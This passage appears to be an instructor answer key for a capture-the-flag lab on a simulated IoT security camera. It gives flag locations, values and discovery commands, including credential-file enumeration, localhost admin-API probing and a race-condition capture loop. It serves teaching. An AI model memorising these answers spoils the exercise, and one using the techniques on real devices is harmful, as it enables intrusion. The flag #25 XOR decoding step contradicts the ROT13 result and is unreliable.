- Database concept understanding
- SQL query knowledge (if tool available)
- Strings extraction as fallback
- Data structure analysis

**Pedagogical Value**:
- Teaches SQLite database enumeration
- Shows structured data storage
- Demonstrates tool limitations on embedded systems
- Introduces binary file analysis (strings)

**Real-World Parallel**: IoT devices commonly use SQLite for event logging, configuration storage, and user data—often unencrypted.

---

## Hard Flags - Expert Techniques

### Teaching Strategy for Hard Flags

**Objective**: Challenge advanced students with complex scenarios

**Method**: Multi-step exploitation requiring:
- Shared memory analysis
- Timing-based attacks (race conditions)
- Bootloader configuration extraction
- JTAG/hardware interface understanding
- Advanced cryptanalysis (XOR + ROT13)
- Hidden file/temp file discovery
- Internal SSRF exploitation

**Skills Taught**:
- Memory forensics
- Physical security concepts
- Complex encoding chains
- Temporary file monitoring
- Race condition exploitation
- Internal network enumeration

---

### FLAG #3: Shared Memory Analysis (HARD - 40 points)

**Location**: `/dev/shm/axis/ipc/camera_control.shm`  
**Flag**: `FLAG{GOLLUM73854692}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

```bash
# Navigate to shared memory
cd /dev/shm/axis/ipc/

# List shared memory segments
ls -la

# Read shared memory file (binary data)
cat camera_control.shm
```

**Expected Output** (binary with text segments):
```
[Binary data...]
<CAMERA_CONTROL>
  <MUTEX_LOCK>0x7f4d2c0a1000</MUTEX_LOCK>
  <PROCESS_1>camera_main</PROCESS_1>
  <PROCESS_2>event_handler</PROCESS_2>
  <IPC_KEY>FLAG{GOLLUM73854692}</IPC_KEY>
  <SHARED_STATE>0x7f4d2c0a2000</SHARED_STATE>
</CAMERA_CONTROL>
[Binary data...]
```

**Analysis Methods**:

```bash
# Method 1: Strings extraction
strings camera_control.shm 

# Method 2: Hexdump with ASCII
hexdump -C camera_control.shm 
```

**Why This Flag is Hard**:
- Shared memory concept understanding
- Binary file analysis required
- /dev/shm location knowledge
- Inter-process communication (IPC) knowledge
- Multiple analysis approaches needed

**Pedagogical Value**:
- Teaches shared memory segments
- Shows inter-process communication mechanisms
- Demonstrates binary file analysis techniques
- Introduces process synchronization concepts
- Emphasizes volatile storage (cleared on reboot)

**Real-World Parallel**: Shared memory contains process credentials, session tokens, and decrypted data temporarily stored for IPC.

---

### FLAG #18: Bootloader Image Analysis (HARD - 40 points)

**Location**: `/var/lib/persistent/firmware/backups/bootloader.img`  
**Flag**: `FLAG{SMEAGOL95772184}`  
**OWASP Category**: IoT-10 (Lack of Physical Hardening)

**Discovery Method**:

```bash
# Navigate to firmware backups
cd /var/lib/persistent/firmware/backups/

# List backup files
ls -lah

# Check file type
file bootloader.img
```

**Expected Output**:
```
bootloader.img: data
```

**Analysis Steps**:

```bash
# Extract strings from binary
strings bootloader.img | head -50

# Search for flag pattern
strings bootloader.img

# Hexdump analysis
hexdump -C bootloader.img
```

**Expected Strings Output**:
```
U-Boot 2021.04
AXIS M1025 Bootloader
Loading kernel...
Boot environment:
bootcmd=bootm 0x80000000
bootdelay=3
unlock_code=FLAG{SMEAGOL95772184}
baudrate=115200
```

**Why This Flag is Hard**:
- Bootloader understanding required
- Binary image analysis
- Firmware backup location discovery
- Multiple analysis tools needed
- U-Boot environment knowledge

**Pedagogical Value**:
- Teaches bootloader role in embedded systems
- Shows U-Boot environment variables
- Demonstrates firmware backup analysis
- Introduces physical security bypass codes
- Emphasizes boot sequence security

**Real-World Parallel**: Bootloader unlock codes and debug keys stored in firmware enable physical attackers to gain full device control via UART.

---

### FLAG #20: Hidden Configuration Backup (HARD - 35 points)

**Location**: `/mnt/flash/config/.backup/.shadow_config`  
**Flag**: `FLAG{WORMTONGUE19485736}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

```bash
# Navigate to config directory
cd /mnt/flash/config/

# List ALL files including hidden
ls -la

# Check for hidden directories
ls -lad .*

# Enter hidden backup directory
cd .backup

# List contents
ls -la

# Read shadow configuration
cat .shadow_config
```

**Expected Output**:
```
# Shadow Configuration Backup
# Created: 2021-04-15
# DO NOT DELETE - Required for factory reset

[Backup Credentials]
root_password_hash = $6$xyz$hashedvalue...
admin_recovery_code = FLAG{WORMTONGUE19485736}

[Network Backup]
default_ip = 192.168.1.100
default_gateway = 192.168.1.1
dns_primary = 8.8.8.8

[System Restore]
factory_reset_enabled = true
restore_point = /mnt/flash/config/factory/
```

**Why This Flag is Hard**:
- Multiple levels of hidden directories
- Knowledge of dot-file/directory convention
- ls -la required (not just ls)
- Deep directory nesting
- Understanding of backup mechanisms

**Pedagogical Value**:
- Teaches hidden directory discovery
- Shows backup as attack surface
- Demonstrates recovery code storage
- Introduces factory reset mechanisms
- Emphasizes systematic enumeration

**Real-World Parallel**: Hidden backup configurations frequently contain recovery codes, password hashes, and failsafe credentials.

---

### FLAG #21: U-Boot Environment Variables (HARD - 40 points)

**Location**: `/mnt/flash/boot/uboot/uboot.env`  
**Flag**: `FLAG{RADAGAST03390806}`  
**OWASP Category**: IoT-10 (Lack of Physical Hardening)

**Discovery Method**:

```bash
# Navigate to boot directory
cd /mnt/flash/boot/uboot/

# List bootloader files
ls -la

# Read U-Boot environment
cat uboot.env
```

**Expected Output**:
```
# U-Boot Environment Variables
# AXIS M1025 Bootloader Configuration

bootcmd=bootm 0x80000000
bootdelay=3
baudrate=115200
console=ttyS0,115200

# Boot Arguments
bootargs=console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs

# Network Boot (if enabled)
ipaddr=192.168.1.100
serverip=192.168.1.10
netmask=255.255.255.0

# Debug Configuration
debug_enabled=1
uart_unlock_code=FLAG{RADAGAST03390806}

# Memory Configuration
mem=256M
```

**Why This Flag is Hard**:
- Bootloader concept understanding
- U-Boot environment variable knowledge
- Boot process comprehension
- Physical security implications
- UART access understanding

**Pedagogical Value**:
- Teaches U-Boot bootloader architecture
- Shows environment variable storage
- Demonstrates boot sequence control
- Introduces UART serial console concepts
- Emphasizes physical attack vectors

**Real-World Parallel**: U-Boot environment variables contain console unlock codes, network boot credentials, and debug settings exploitable via UART.

---

### FLAG #22: JTAG Debug Configuration (HARD - 40 points)

**Location**: `/var/lib/axis/conf/hardware_debug.conf`  
**Flag**: `FLAG{GLORFINDEL34806732}`  
**OWASP Category**: IoT-10 (Lack of Physical Hardening)

**Discovery Method**:

```bash
# Check hardware configuration
cd /var/lib/axis/conf/

# Read hardware debug config
cat hardware_debug.conf
```

**Expected Output**:
```
[Hardware Debug Interface]
jtag_enabled = true
jtag_port = /dev/jtag0
jtag_speed = 1000000

[JTAG Configuration]
tap_id = 0x4BA00477
unlock_sequence = FLAG{GLORFINDEL34806732}
bypass_security = enabled

[Debug Features]
memory_dump = enabled
flash_programming = enabled
cpu_debug = enabled
boundary_scan = enabled

[Warning]
# Disable JTAG in production!
# Physical access provides full device control
```

**Why This Flag is Hard**:
- JTAG protocol knowledge required
- Hardware debugging understanding
- Physical security concepts
- Embedded development familiarity
- TAP ID significance

**Pedagogical Value**:
- Teaches JTAG debugging interface
- Shows physical access attack vectors
- Demonstrates hardware security features
- Introduces chip-level debugging
- Emphasizes production hardening requirements

**Real-World Parallel**: JTAG interfaces left enabled allow attackers with physical access to dump firmware, extract encryption keys, and modify flash memory.

---

### FLAG #23: SSRF Internal API Access (HARD - 45 points)

**Location**: Internal localhost API (accessed via curl from camera)  
**Flag**: `FLAG{ELENDIL66222658}`  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

This flag requires understanding that the camera has internal APIs running on localhost that aren't exposed externally.

```bash
# Check listening services
netstat -tuln | grep LISTEN

# Expected output shows:
# tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN
```

**Internal API Enumeration**:

```bash
# Test internal API endpoints
curl http://127.0.0.1:8888/

# Check for API documentation
curl http://127.0.0.1:8888/api/

# Try common paths
curl http://127.0.0.1:8888/status
curl http://127.0.0.1:8888/config
curl http://127.0.0.1:8888/admin

# The flag is in the admin endpoint
curl http://127.0.0.1:8888/admin
```

**Expected Response**:
```json
{
  "service": "Internal Admin API",
  "version": "1.0",
  "access_level": "localhost_only",
  "admin_token": "FLAG{ELENDIL66222658}",
  "features": [
    "system_config",
    "factory_reset",
    "debug_mode"
  ]
}
```

**Why This Flag is Hard**:
- Requires network service enumeration
- Understanding of localhost-only services
- SSRF concept comprehension
- API endpoint discovery
- JSON response parsing

**Pedagogical Value**:
- Teaches internal API enumeration
- Shows localhost-only service security model
- Demonstrates SSRF exploitation concept
- Introduces service binding (127.0.0.1 vs 0.0.0.0)
- Emphasizes internal vs external attack surfaces

**Real-World Parallel**: Many IoT devices run administrative APIs on localhost assuming they're protected, but they're vulnerable to SSRF attacks.

---

### FLAG #25: Complex Encoding Chain (HARD - 45 points)

**Location**: `/usr/local/axis/lib/crypto_weak.so.txt`  
**Flag**: `FLAG{SARUMAN_CORRUPTED_58392746}` (after XOR + ROT13 decoding)  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

```bash
# Navigate to library directory
cd /usr/local/axis/lib/

# List library files
ls -la

# Read the text file (not actual .so)
cat crypto_weak.so.txt
```

**Expected Output** (XOR'd then ROT13'd):
```
# Jrnx Pelcgb Zbqhyr
# Pelcgb Xrl: KBE jvgu 0k55, gura EBG13

Rapelcgrq xrl: SYNT{FNEHZNA_PBEEHCGRQ_58392746}
```

**Decoding Steps**:

**Step 1: Recognize ROT13** (FLAG -> SYNT pattern)
```bash
# ROT13 decode
echo "SYNT{FNEHZNA_PBEEHCGRQ_58392746}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Output: FLAG{SARUMAN_CORRUPTED_58392746}
```

**Step 2: If output still looks encoded**, the data was XOR'd first, then ROT13'd:
```python
# Full decode: XOR with 0x55, then ROT13
import codecs

# First ROT13 decode
rot13_decoded = codecs.encode("SYNT{FNEHZNA_PBEEHCGRQ_58392746}", 'rot_13')

# Then XOR with 0x55
xor_key = 0x55
result = ''.join(chr(ord(c) ^ xor_key) for c in rot13_decoded)
print(result)
```

**Simplified Discovery** (if ROT13 alone works):
```bash
cat crypto_weak.so.txt | grep "Rapelcgrq" | cut -d: -f2 | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Why This Flag is Hard**:
- Multiple encoding layers
- Cryptanalysis required
- Pattern recognition needed
- Encoding chain understanding
- Weak crypto demonstration

**Pedagogical Value**:
- Teaches multi-layer encoding
- Shows encoding ≠ encryption
- Demonstrates cryptanalysis basics
- Introduces XOR cipher weakness
- Emphasizes proper cryptography importance

**Real-World Parallel**: Developers often chain weak encodings (XOR, ROT13, base64) thinking multiple layers provide security—they don't.

---

### FLAG #26: Hidden Temporary File (HARD - 40 points)

**Location**: `/var/cache/recorder/.temp/.recording_session_12345`  
**Flag**: `FLAG{GRIMA_WORMTONGUE_76241893}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

```bash
# Navigate to recorder cache
cd /var/cache/recorder/

# List ALL files including hidden
ls -la

# Enter hidden temp directory
cd .temp

# List session files
ls -la

# Read recording session file
cat .recording_session_12345
```

**Expected Output**:
```
[Recording Session Metadata]
session_id = 12345
started = 2024-01-27T10:15:00Z
duration = 3600
resolution = 1920x1080

[Temporary Credentials]
cloud_upload_token = FLAG{GRIMA_WORMTONGUE_76241893}
stream_key = temp_stream_xyz123
expires = 2024-01-27T11:15:00Z

[Storage]
local_path = /var/cache/recorder/sessions/12345/
cloud_path = s3://axis-recordings/camera-001/
```

**Why This Flag is Hard**:
- Multiple hidden directory levels
- Temporary file understanding
- Session management knowledge
- Enumeration thoroughness required
- Dot-file convention mastery

**Pedagogical Value**:
- Teaches temporary file analysis
- Shows session credential storage
- Demonstrates cache directory enumeration
- Introduces cloud integration tokens
- Emphasizes complete enumeration

**Real-World Parallel**: Temporary session files frequently contain cloud storage credentials, API tokens, and session keys meant to be short-lived but persisting longer than intended.

---

### FLAG #27: Race Condition Exploitation (HARD - 50 points)

**Location**: `/dev/shm/axis/runtime/temp_flag_$$` (PID-based temporary file)  
**Flag**: `FLAG{ARAGORN91886362}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

This flag requires exploiting a race condition where a script creates a temporary file, performs operations, then deletes it quickly.

**Step 1: Identify the race-prone script**
```bash
# Find scripts that use temp files
find /usr/local/axis/share/scripts/ -type f -exec grep -l "temp" {} \;

# Expected: /usr/local/axis/share/scripts/camera_init.sh
```

**Step 2: Examine the script**
```bash
cat /usr/local/axis/share/scripts/camera_init.sh
```

**Script Content**:
```bash
#!/bin/sh
# Camera Initialization Script

# Create temporary flag file
echo "FLAG{ARAGORN91886362}" > /dev/shm/axis/runtime/temp_flag_$$

# Perform initialization
sleep 0.1

# Cleanup
rm -f /dev/shm/axis/runtime/temp_flag_$$
```

**Step 3: Exploit the race condition**

**Trigger and capture**
```bash
# Terminal 1: Start monitoring
while true; do cat /dev/shm/axis/runtime/temp_flag_* 2>/dev/null; done

# Terminal 2: Trigger the script
/usr/local/axis/share/scripts/camera_init.sh
```

**Why This Flag is Hard**:
- Race condition understanding
- Timing attack comprehension
- TOCTOU vulnerability knowledge
- Multiple terminal coordination
- Script triggering required
- Process monitoring skills

**Pedagogical Value**:
- Teaches race condition exploitation
- Shows TOCTOU (Time-Of-Check-Time-Of-Use) vulnerabilities
- Demonstrates timing-based attacks
- Introduces process monitoring techniques
- Emphasizes secure temporary file handling

**Real-World Parallel**: Race conditions in temporary file creation allow attackers to capture sensitive data during brief windows, a common vulnerability in embedded systems.

---

#### Common Student Challenges

**Challenge 0**: "Some flags are not in their proper locations"
- **Solution**: Rerun the "vulnaxis.sh" script.
- Sometimes if the AXIS security camera is unexpectedly shut down, the flags get erased.

**Challenge 1**: "I don't know where to start"
- **Solution**: Teach systematic enumeration framework
- Start with vendor directory: `/var/lib/axis/`
- Then persistent storage: `/mnt/flash/`, `/var/lib/persistent/`
- Finally runtime: `/run/`, `/dev/shm/`, `/var/cache/`

**Challenge 2**: "I found the file but don't see the flag"
- **Solution**: Emphasize reading ENTIRE files
- Don't just grep for "FLAG{"
- Understand file context and purpose
- Some flags require analysis (encoding, parsing)

**Challenge 3**: "The encoded flag looks like gibberish"
- **Solution**: Teach encoding recognition
- ROT13: SYNT{ instead of FLAG{
- XOR patterns: Unusual character distributions
- Multi-layer: Try decoding in stages

**Challenge 4**: "I can't capture the race condition flag"
- **Solution**: Provide automation guidance
- Use while loops for continuous monitoring
- Explain TOCTOU concepts clearly
- Show inotify as advanced alternative
